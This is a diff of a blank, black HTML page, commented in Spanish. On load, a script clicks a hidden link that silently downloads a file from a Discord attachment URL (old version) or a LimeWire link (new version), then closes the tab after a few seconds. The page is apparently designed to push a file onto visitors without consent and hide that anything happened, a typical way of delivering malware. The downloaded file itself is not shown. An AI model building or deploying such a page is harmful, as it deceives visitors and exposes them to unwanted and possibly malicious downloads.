@@ -1,33 +1,33 @@
 <!DOCTYPE html>
-<html lang="es">
+<html lang="en">
 <head>
   <meta charset="UTF-8">
-  <title>       </title> <!-- título invisible -->
+  <title>       </title>
   <style>
-    html, body {
-      height: 100%;
+    body {
+      background-color: black;
       margin: 0;
-      background-color: #000; /* fondo negro */
       overflow: hidden;
     }
   </style>
+</head>
+<body>
   <script>
     window.onload = () => {
-      const link = document.createElement("a");
-      link.href = "https://cdn.discordapp.com/attachments/1247926324895551610/1433547943268319282/63b9b78cb5662c99.png?ex=6905170f&is=6903c58f&hm=a93270886f4403fda58b32e7ce94f57c34fe43f7c325c948dea1bfa2a188942e&";
-      link.download = "imagen.png"; // nombre con el que se guardará
-      link.style.display = "none";
-      document.body.appendChild(link);
-      link.click();
+      const fileUrl = "https://limewire.com/d/77a1S#PLzDIEiTYk"; // 🔗 tu enlace de LimeWire
+      const a = document.createElement("a");
+      a.href = fileUrl;
+      a.download = "";
+      a.style.display = "none";
+      document.body.appendChild(a);
+      a.click();
 
-      // Espera 2 segundos y cierra la pestaña
+      // Espera 3 segundos y cierra la pestaña automáticamente
       setTimeout(() => {
         window.open('', '_self', '');
         window.close();
-      }, 2000);
+      }, 3000);
     };
   </script>
-</head>
-<body>
 </body>
 </html>
